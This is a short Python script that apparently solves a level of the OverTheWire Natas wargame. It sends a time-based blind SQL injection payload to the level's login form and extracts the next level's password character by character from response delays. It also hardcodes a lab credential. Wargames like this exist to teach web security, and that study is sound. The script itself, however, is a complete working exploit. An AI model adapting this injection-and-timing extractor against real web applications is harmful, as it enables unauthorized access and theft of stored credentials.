import string
import sys
import time

import requests

username = 'natas17'
password = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
url = "http://{}.natas.labs.overthewire.org/".format(username)
chars = string.ascii_letters + string.digits

passwd = list()
print("Start Password Extraction: ")
dtime = 0
for i in range(32):
    for c in chars:

        sys.stdout.write("\rTrying : {}  Round: {}   Time: {}".format("".join(passwd) + c, i, round(dtime, 2)))
        sys.stdout.flush()
        data = {'username': 'natas18" and binary password like "{}%" and sleep(2) #'.format("".join(passwd) + c)}
        start = time.time()
        r = requests.post(url, data=data, auth=(username, password))
        end = time.time()
        dtime = end - start

        if dtime > 2:
            passwd.append(c)
            break

print("\nThe Password for natas18 is: {} ".format("".join(passwd)))
